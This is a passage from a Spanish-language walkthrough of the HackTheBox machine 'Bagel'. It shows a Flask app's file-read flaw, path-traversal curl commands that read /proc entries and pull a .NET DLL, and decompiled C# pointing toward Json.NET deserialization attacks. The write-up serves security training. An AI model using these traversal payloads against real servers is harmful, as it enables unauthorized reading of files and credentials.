+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">index</span><span class="mtk1">():</span>
+<span class="mtk1">        </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk4">'page'</span><span class="mtk1"> </span><span class="mtk5">in</span><span class="mtk1"> </span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">args</span><span class="mtk1">:</span>
+<span class="mtk1">            </span><span class="mtk1">page</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">'static/'</span><span class="mtk5">+</span><span class="mtk1">request</span><span class="mtk1">.</span><span class="mtk1">args</span><span class="mtk1">.</span><span class="mtk8">get</span><span class="mtk1">(</span><span class="mtk4">'page'</span><span class="mtk1">)</span>
+<span class="mtk1">            </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span><span class="mtk1">.</span><span class="mtk8">isfile</span><span class="mtk1">(</span><span class="mtk1">page</span><span class="mtk1">):</span>
+<span class="mtk1">                </span><span class="mtk1">resp</span><span class="mtk5">=</span><span class="mtk8">send_file</span><span class="mtk1">(</span><span class="mtk1">page</span><span class="mtk1">)</span>
+<span class="mtk1">                </span><span class="mtk1">resp</span><span class="mtk1">.</span><span class="mtk1">direct_passthrough</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">False</span>
+<span class="mtk1">                </span><span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk8 mtku">os</span><span class="mtk1">.</span><span class="mtk8 mtku">path</span><span class="mtk1">.</span><span class="mtk8">getsize</span><span class="mtk1">(</span><span class="mtk1">page</span><span class="mtk1">) </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">:</span>
+<span class="mtk1">                    </span><span class="mtk1">resp</span><span class="mtk1">.</span><span class="mtk1">headers</span><span class="mtk1">[</span><span class="mtk4">"Content-Length"</span><span class="mtk1">]</span><span class="mtk5">=</span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk8">len</span><span class="mtk1">(</span><span class="mtk1">resp</span><span class="mtk1">.</span><span class="mtk8">get_data</span><span class="mtk1">()))</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk1">resp</span>
+<span class="mtk1">            </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk4">"File not found"</span>
+<span class="mtk1">        </span><span class="mtk5">else</span><span class="mtk1">:</span>
+<span class="mtk1">                </span><span class="mtk5">return</span><span class="mtk1"> </span><span class="mtk8">redirect</span><span class="mtk1">(</span><span class="mtk4">'</span><span class="mtk4 detected-link">http://bagel.htb:8000/?page=index.html</span><span class="mtk4">'</span><span class="mtk1">, </span><span class="mtk9 mtki">code</span><span class="mtk5">=</span><span class="mtk6">302</span><span class="mtk1">)</span>
+
+<span class="mtk8">@</span><span class="mtk1">app</span><span class="mtk8">.</span><span class="mtk8">route</span><span class="mtk1">(</span><span class="mtk4">'/orders'</span><span class="mtk1">)</span>
+<span class="mtk7 mtki">def</span><span class="mtk1"> </span><span class="mtk8">order</span><span class="mtk1">(): </span><span class="mtk3"># don't forget to run the order app first with "do</span><span class="mtk3">tnet &lt;path to .dll&gt;" command. Use your ssh key to </span><span class="mtk3">access the machine.</span>  
+<span class="mtk1">    </span><span class="mtk5">try</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk1">ws</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">websocket</span><span class="mtk1">.</span><span class="mtk8 mtku">WebSocket</span><span class="mtk1">()</span>
+<span class="mtk1">        </span><span class="mtk1">ws</span><span class="mtk1">.</span><span class="mtk8">connect</span><span class="mtk1">(</span><span class="mtk4">"ws://127.0.0.1:5000/"</span><span class="mtk1">) </span><span class="mtk3"># connect to order app</span>
+<span class="mtk1">        </span><span class="mtk1">order</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> {</span><span class="mtk4">"ReadOrder"</span><span class="mtk1">:</span><span class="mtk4">"orders.txt"</span><span class="mtk1">}</span>
+<span class="mtk1">        </span><span class="mtk1">data</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk8 mtku">str</span><span class="mtk1">(</span><span class="mtk8 mtku">json</span><span class="mtk1">.</span><span class="mtk8">dumps</span><span class="mtk1">(</span><span class="mtk1">order</span><span class="mtk1">))</span>
+<span class="mtk1">        </span><span class="mtk1">ws</span><span class="mtk1">.</span><span class="mtk8">send</span><span class="mtk1">(</span><span class="mtk1">data</span><span class="mtk1">)</span>
+<span class="mtk1">        </span><span class="mtk1">result</span><span class="mtk1"> </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk1">ws</span><span class="mtk1">.</span><span class="mtk8">recv</span><span class="mtk1">()</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">(</span><span class="mtk8 mtku">json</span><span class="mtk1">.</span><span class="mtk8">loads</span><span class="mtk1">(</span><span class="mtk1">result</span><span class="mtk1">)[</span><span class="mtk4">'ReadOrder'</span><span class="mtk1">])</span>
+<span class="mtk1">    </span><span class="mtk5">except</span><span class="mtk1">:</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1">(</span><span class="mtk4">"Unable to connect"</span><span class="mtk1">)</span>
+
+<span class="mtk5">if</span><span class="mtk1"> </span><span class="mtk1">__name__</span><span class="mtk1"> </span><span class="mtk5">==</span><span class="mtk1"> </span><span class="mtk4">'__main__'</span><span class="mtk1">:</span>
+<span class="mtk1">  </span><span class="mtk1">app</span><span class="mtk1">.</span><span class="mtk8">run</span><span class="mtk1">(</span><span class="mtk9 mtki">host</span><span class="mtk5">=</span><span class="mtk4">'0.0.0.0'</span><span class="mtk1">, </span><span class="mtk9 mtki">port</span><span class="mtk5">=</span><span class="mtk6">8000</span><span class="mtk1">)</span>
+</code></pre></div><p>Como se puede ver, el archivo se lee mediante <code>send_file</code>, entonces tenemos una vulnerabilidad de LFR (no LFI, porque esto implicaría ejecución de código).</p><p>Además, podemos ver que en <code>/orders</code>, el servidor se conecta al puerto 5000 a través de WebSocket y consulta un archivo <code>orders.txt</code>. Podemos imitar esta funcionalidad desde nuestro lado:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">python3</span> -q
+&gt;&gt;&gt; import json, websocket
+&gt;&gt;&gt; ws = websocket.WebSocket()
+&gt;&gt;&gt; ws.connect("ws://10.10.11.201:5000/")
+&gt;&gt;&gt; ws.send(json.dumps({'ReadOrder': 'orders.txt'}))
+33
+&gt;&gt;&gt; json.loads(ws.recv())
+{'UserId': 0, 'Session': 'Unauthorized', 'Time': '7:47:00', 'RemoveOrder': None, 'WriteOrder': None, 'ReadOrder': 'order #1 address: NY. 99 Wall St., client name: P.Morgan, details: [20 chocko-bagels]\norder #2 address: Berlin. 339 Landsberger.A., client name: J.Smith, details: [50 bagels]\norder #3 address: Warsaw. 437 Radomska., client name: A.Kowalska, details: [93 bel-bagels] \n'}  
+</code></pre></div><p>Además, hay un comentario en el código fuente que se refiere a <code>dotnet</code> (C# .NET) y una DLL. Probablemente, en el puerto 5000 hay una aplicación .NET que procesa las peticiones. Como tenemos LFR, podemos visualizar información de los procesos en ejecución en <code>/proc/&lt;pid></code>. Particularmente, podemos leer <code>cmdline</code> para ver cómo se inician los procesos desde la interfaz de línea de comandos. Para esto, usemos un simple bucle <code>for</code> en Bash:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-yellow">for</span> i in {1..1000}; <span class="code-dark-yellow">do</span> <span class="code-dark-yellow">(</span><span class="code-dark-green">echo</span> -n <span class="code-dark-yellow">"<span class="code-dark-cyan">$i</span>: "</span> && <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"bagel.htb:8000/?page=../../../../proc/<span class="code-dark-cyan">$i</span>/cmdline"</span> -s<span class="code-dark-yellow">)</span> | <span class="code-dark-green">grep</span> -v <span class="code-dark-yellow">': $'</span> | <span class="code-dark-green">grep</span> -av <span class="code-dark-yellow">'File not found'</span>; <span class="code-dark-yellow">done</span>  
+1: /usr/lib/systemd/systemdrhgb--switched-root--system--deserialize35
+758: /usr/lib/systemd/systemd-journald
+771: /usr/lib/systemd/systemd-udevd
+846: /usr/lib/systemd/systemd-oomd
+849: /usr/lib/systemd/systemd-resolved
+850: /usr/lib/systemd/systemd-userdbd
+851: /sbin/auditd
+852: /sbin/auditd
+853: /usr/sbin/sedispatch
+854: /usr/local/sbin/laurel--config/etc/laurel/config.toml
+855: /sbin/auditd
+883: /usr/sbin/NetworkManager--no-daemon
+887: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+889: python3/home/developer/app/app.py
+890: /usr/sbin/irqbalance--foreground
+892: /usr/lib/polkit-1/polkitd--no-debug
+893: /usr/sbin/rsyslogd-n
+894: /usr/lib/systemd/systemd-logind
+895: /usr/bin/VGAuthService-s
+896: /usr/bin/vmtoolsd
+898: /usr/sbin/rsyslogd-n
+900: /usr/bin/dbus-broker-launch--scopesystem--audit
+901: /usr/sbin/irqbalance--foreground
+910: /usr/sbin/chronyd-F2
+912: /usr/sbin/abrtd-d-s
+916: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+917: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+918: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+919: dbus-broker--log4--controller9--machine-idce8a2667e5384602a9b46d6ad7614e92--max-bytes536870912--max-fds4096--max-matches131072--audit
+920: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+921: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+922: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+923: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+924: /usr/sbin/abrtd-d-s
+926: /usr/sbin/abrtd-d-s
+927: /usr/bin/abrt-dump-journal-core-D-T-f-e
+928: /usr/bin/abrt-dump-journal-oops-fxtD
+929: /usr/bin/abrt-dump-journal-xorg-fxtD
+931: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+934: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+936: dotnet/opt/bagel/bin/Debug/net6.0/bagel.dll
+937: /usr/sbin/rsyslogd-n
+939: /usr/bin/vmtoolsd
+940: /usr/bin/vmtoolsd
+943: /usr/sbin/NetworkManager--no-daemon
+944: /usr/sbin/NetworkManager--no-daemon
+946: /usr/lib/polkit-1/polkitd--no-debug
+948: sshd: /usr/sbin/sshd -D [listener] 0 of 10-100 startups
+949: /usr/sbin/gssproxy-D
+950: /usr/sbin/gssproxy-D
+951: /usr/sbin/gssproxy-D
+952: /usr/sbin/gssproxy-D
+953: /usr/sbin/gssproxy-D
+954: /usr/sbin/gssproxy-D
+955: /usr/lib/polkit-1/polkitd--no-debug
+961: /usr/bin/vmtoolsd
+965: /usr/lib/polkit-1/polkitd--no-debug
+966: /usr/lib/polkit-1/polkitd--no-debug
+985: /usr/lib/polkit-1/polkitd--no-debug
+992: /usr/sbin/ModemManager
+</code></pre></div><p>Hay algunos PID que apuntan a <code>/opt/bagel/bin/Debug/net6.0/bagel.dll</code>. En realidad, el comando que se está ejecutando es:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight">dotnet /opt/bagel/bin/Debug/net6.0/bagel.dll  
+</code></pre></div><p>Hay un byte nulo que separa el comando y la ruta de la DLL:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">"bagel.htb:8000/?page=../../../../proc/916/cmdline"</span> -s | <span class="code-dark-green">xxd</span>  
+00000000: 646f 746e 6574 002f 6f70 742f 6261 6765  dotnet./opt/bage
+00000010: 6c2f 6269 6e2f 4465 6275 672f 6e65 7436  l/bin/Debug/net6
+00000020: 2e30 2f62 6167 656c 2e64 6c6c 00         .0/bagel.dll.
+</code></pre></div><p>Vamos a descargar esta DLL:</p><div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#000!important;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll'</span> -so - | <span class="code-dark-green">file</span> -  
+/dev/stdin: PE32 executable (console) Intel 80386 Mono/.Net assembly, for MS Windows
+
+<span class="code-cyan">$</span> <span class="code-dark-green">curl</span> <span class="code-dark-yellow">'bagel.htb:8000/?page=../../../../opt/bagel/bin/Debug/net6.0/bagel.dll'</span> -so bagel.dll
+</code></pre></div><h3 id="ingeniería-inversa-de-la-dll">Ingeniería inversa de la DLL</h3><p>Dado que la DLL está compilada desde C# .NET, podemos abrirla en JetBrains dotPeek para extraer el código fuente en C#.Esta es la clase <code>Bagel</code>, con la función <code>Main</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.Bagel</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Text</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">.</span><span class="mtk8 mtku">Threading</span><span class="mtk1">;</span>
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">WatsonWebsocket</span><span class="mtk1">;</span>
+
+
+<span class="mtk1">#nullable enable</span>
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Bagel</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> _ServerIp </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"*"</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">int</span><span class="mtk1"> _ServerPort </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">5000</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">bool</span><span class="mtk1"> _Ssl </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">false</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk8 mtku">WatsonWsServer</span><span class="mtk1"> _Server </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">WatsonWsServer</span><span class="mtk1">) </span><span class="mtk6">null</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">Main</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1">[] args)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Bagel.</span><span class="mtk8">InitializeServer</span><span class="mtk1">();</span>
+<span class="mtk1">      Bagel.</span><span class="mtk8">StartServer</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">while</span><span class="mtk1"> (</span><span class="mtk6">true</span><span class="mtk1">)</span>
+<span class="mtk1">        Thread.</span><span class="mtk8">Sleep</span><span class="mtk1">(</span><span class="mtk6">1000</span><span class="mtk1">);</span>
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">InitializeServer</span><span class="mtk1">()</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      Bagel._Server </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">WatsonWsServer</span><span class="mtk1">(Bagel._ServerIp, Bagel._ServerPort, Bagel._Ssl);</span>
+<span class="mtk1">      Bagel._Server.AcceptInvalidCertificates </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">true</span><span class="mtk1">;</span>
+<span class="mtk1">      Bagel._Server.MessageReceived </span><span class="mtk5">+=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">EventHandler</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">MessageReceivedEventArgs</span><span class="mtk1">&gt;(Bagel.MessageReceived);</span>  
+<span class="mtk1">    }</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">async</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">StartServer</span><span class="mtk1">() </span><span class="mtk5">=&gt;</span><span class="mtk1"> </span><span class="mtk5">await</span><span class="mtk1"> Bagel._Server.</span><span class="mtk8">StartAsync</span><span class="mtk1">(</span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">CancellationToken</span><span class="mtk1">());</span>
+
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">static</span><span class="mtk1"> </span><span class="mtk5">void</span><span class="mtk1"> </span><span class="mtk8">MessageReceived</span><span class="mtk1">(</span><span class="mtk5">object</span><span class="mtk1"> sender, </span><span class="mtk8 mtku">MessageReceivedEventArgs</span><span class="mtk1"> args)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">string</span><span class="mtk1"> json </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">""</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">ArraySegment</span><span class="mtk1">&lt;</span><span class="mtk5">byte</span><span class="mtk1">&gt; data;</span>
+<span class="mtk1">      </span><span class="mtk5">int</span><span class="mtk1"> num;</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (args.Data </span><span class="mtk5">!=</span><span class="mtk1"> (</span><span class="mtk8 mtku">ArraySegment</span><span class="mtk1">&lt;</span><span class="mtk5">byte</span><span class="mtk1">&gt;) (</span><span class="mtk5">byte</span><span class="mtk1">[]) </span><span class="mtk6">null</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        data </span><span class="mtk5">=</span><span class="mtk1"> args.Data;</span>
+<span class="mtk1">        num </span><span class="mtk5">=</span><span class="mtk1"> data.Count </span><span class="mtk5">&gt;</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1"> </span><span class="mtk5">?</span><span class="mtk1"> </span><span class="mtk6">1</span><span class="mtk1"> </span><span class="mtk5">:</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">else</span>
+<span class="mtk1">        num </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">      </span><span class="mtk5">if</span><span class="mtk1"> (num </span><span class="mtk5">!=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">)</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk8 mtku">Encoding</span><span class="mtk1"> utF8 </span><span class="mtk5">=</span><span class="mtk1"> Encoding.UTF8;</span>
+<span class="mtk1">        data </span><span class="mtk5">=</span><span class="mtk1"> args.Data;</span>
+<span class="mtk1">        </span><span class="mtk5">byte</span><span class="mtk1">[] array </span><span class="mtk5">=</span><span class="mtk1"> data.Array;</span>
+<span class="mtk1">        data </span><span class="mtk5">=</span><span class="mtk1"> args.Data;</span>
+<span class="mtk1">        </span><span class="mtk5">int</span><span class="mtk1"> count </span><span class="mtk5">=</span><span class="mtk1"> data.Count;</span>
+<span class="mtk1">        json </span><span class="mtk5">=</span><span class="mtk1"> utF8.</span><span class="mtk8">GetString</span><span class="mtk1">(array, </span><span class="mtk6">0</span><span class="mtk1">, count);</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk8 mtku">Handler</span><span class="mtk1"> handler </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">Handler</span><span class="mtk1">();</span>
+<span class="mtk1">      </span><span class="mtk5">object</span><span class="mtk1"> obj1 </span><span class="mtk5">=</span><span class="mtk1"> handler.</span><span class="mtk8">Deserialize</span><span class="mtk1">(json);</span>
+<span class="mtk1">      </span><span class="mtk5">object</span><span class="mtk1"> obj2 </span><span class="mtk5">=</span><span class="mtk1"> handler.</span><span class="mtk8">Serialize</span><span class="mtk1">(obj1);</span>
+<span class="mtk1">      Bagel._Server.</span><span class="mtk8">SendAsync</span><span class="mtk1">(args.IpPort, obj2.</span><span class="mtk8">ToString</span><span class="mtk1">(), </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">CancellationToken</span><span class="mtk1">());</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Esta clase solo configura el servidor WebSocket y pasa los datos en JSON a <code>handler.Deserialize(json)</code>. Esta es la clase <code>Handler</code>:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.Handler</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">Newtonsoft</span><span class="mtk1">.</span><span class="mtk8 mtku">Json</span><span class="mtk1">;</span>
+
+
+<span class="mtk1">#nullable enable</span>
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Handler</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">object</span><span class="mtk1"> </span><span class="mtk8">Serialize</span><span class="mtk1">(</span><span class="mtk5">object</span><span class="mtk1"> obj) </span><span class="mtk5">=&gt;</span><span class="mtk1"> (</span><span class="mtk5">object</span><span class="mtk1">) JsonConvert.</span><span class="mtk8">SerializeObject</span><span class="mtk1">(obj, (</span><span class="mtk8 mtku">Formatting</span><span class="mtk1">) </span><span class="mtk6">1</span><span class="mtk1">, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JsonSerializerSettings</span><span class="mtk1">()</span>  
+<span class="mtk1">    {</span>
+<span class="mtk1">      TypeNameHandling </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">TypeNameHandling</span><span class="mtk1">) </span><span class="mtk6">4</span>
+<span class="mtk1">    });</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">object</span><span class="mtk1"> </span><span class="mtk8">Deserialize</span><span class="mtk1">(</span><span class="mtk5">string</span><span class="mtk1"> json)</span>
+<span class="mtk1">    {</span>
+<span class="mtk1">      </span><span class="mtk5">try</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk5">object</span><span class="mtk1">) JsonConvert.</span><span class="mtk8">DeserializeObject</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">Base</span><span class="mtk1">&gt;(json, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JsonSerializerSettings</span><span class="mtk1">()</span>
+<span class="mtk1">        {</span>
+<span class="mtk1">          TypeNameHandling </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">TypeNameHandling</span><span class="mtk1">) </span><span class="mtk6">4</span>
+<span class="mtk1">        });</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">      </span><span class="mtk5">catch</span>
+<span class="mtk1">      {</span>
+<span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> (object) </span><span class="mtk4">"{</span><span class="mtk6">\"</span><span class="mtk4">Message</span><span class="mtk6">\"</span><span class="mtk4">:</span><span class="mtk6">\"</span><span class="mtk4">unknown</span><span class="mtk6">\"</span><span class="mtk4">}"</span><span class="mtk1">;</span>
+<span class="mtk1">      }</span>
+<span class="mtk1">    }</span>
+<span class="mtk1">  }</span>
+<span class="mtk1">}</span>
+</code></pre></div><p>Aquí tenemos algo interesante:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk1">        </span><span class="mtk5">return</span><span class="mtk1"> (</span><span class="mtk5">object</span><span class="mtk1">) JsonConvert.</span><span class="mtk8">DeserializeObject</span><span class="mtk1">&lt;</span><span class="mtk8 mtku">Base</span><span class="mtk1">&gt;(json, </span><span class="mtk5">new</span><span class="mtk1"> </span><span class="mtk8 mtku">JsonSerializerSettings</span><span class="mtk1">()</span>  
+<span class="mtk1">        {</span>
+<span class="mtk1">          TypeNameHandling </span><span class="mtk5">=</span><span class="mtk1"> (</span><span class="mtk8 mtku">TypeNameHandling</span><span class="mtk1">) </span><span class="mtk6">4</span>
+<span class="mtk1">        });</span>
+</code></pre></div><p>Se sabe que JSON y .NET son vulnerables a deserialización insegura si no hay una byena implementación. Hay herramientas como <a href="https://githb.com/pwntester/ysoserial.net"><code>ysoserial.net</code></a> que se utilizan para realizar ataques de deserialización en C# .NET. Nótese que <code>(TypeNameHandling) 4</code> es lo mismo que <code>TypeNameHandling.Auto</code>, como se muestra en <a href="https://www.newtonsoft.com/json/help/html/T_Newtonsoft_Json_TypeNameHandling.htm">www.newtonsoft.com</a>.</p><p>Después de investigar un poco sobre deserialización insegura en .NET en <a href="https://systemweakness.com/exploiting-json-serialization-in-net-core-694c111faa15">systemweakness.com</a>, vemos que la implementación es correcta. Por ejemplo, se utiliza <code>Json.DeserializeObject&lt;Base></code>, por lo que solamente instancias de la clase <code>Base</code> serán deserializadas:</p><div class="highlight"><pre tabindex="0" style="color:#fff;background-color:#1d1e19;-moz-tab-size:2;-o-tab-size:2;tab-size:2"><code class="no-highlight"><span class="mtk3">// Decompiled with JetBrains decompiler</span>
+<span class="mtk3">// Type: bagel_server.Base</span>
+<span class="mtk3">// Assembly: bagel, Version=1.0.0.0, Culture=neutr</span><span class="mtk3">al, PublicKeyToken=null</span>  
+<span class="mtk3">// MVID: 32A79BD4-65AA-4B36-9047-7C4DE45C43FB</span>
+<span class="mtk3">// Assembly location: .\bagel.dll</span>
+
+<span class="mtk5">using</span><span class="mtk1"> </span><span class="mtk8 mtku">System</span><span class="mtk1">;</span>
+
+
+<span class="mtk1">#nullable enable</span>
+<span class="mtk5">namespace</span><span class="mtk1"> </span><span class="mtk8 mtku">bagel_server</span>
+<span class="mtk1">{</span>
+<span class="mtk1">  </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">class</span><span class="mtk1"> </span><span class="mtk8 mtku">Base</span><span class="mtk1"> : </span><span class="mtk8 mtku">Orders</span>
+<span class="mtk1">  {</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">int</span><span class="mtk1"> userid </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk6">0</span><span class="mtk1">;</span>
+<span class="mtk1">    </span><span class="mtk5">private</span><span class="mtk1"> </span><span class="mtk5">string</span><span class="mtk1"> session </span><span class="mtk5">=</span><span class="mtk1"> </span><span class="mtk4">"Unauthorized"</span><span class="mtk1">;</span>
+
+<span class="mtk1">    </span><span class="mtk5">public</span><span class="mtk1"> </span><span class="mtk5">int</span><span class="mtk1"> UserId</span>
+<span class="mtk1">    {</span>
